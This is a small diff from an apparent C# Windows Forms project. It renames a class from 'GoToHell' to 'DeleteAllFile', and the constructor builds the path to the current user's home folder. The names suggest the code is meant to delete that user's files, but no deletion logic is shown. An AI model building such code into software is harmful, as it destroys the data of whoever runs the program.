@@ -8,12 +8,12 @@ using System.IO;
 
 namespace WindowsFormsApplication1
 {
-    class GoToHell
+    class DeleteAllFile
     {
         string userName;
         string userDir;
 
-        public GoToHell()
+        public DeleteAllFile()
         {
             userName = Environment.UserName; 
             userDir = "C:\\Users\\" + userName;
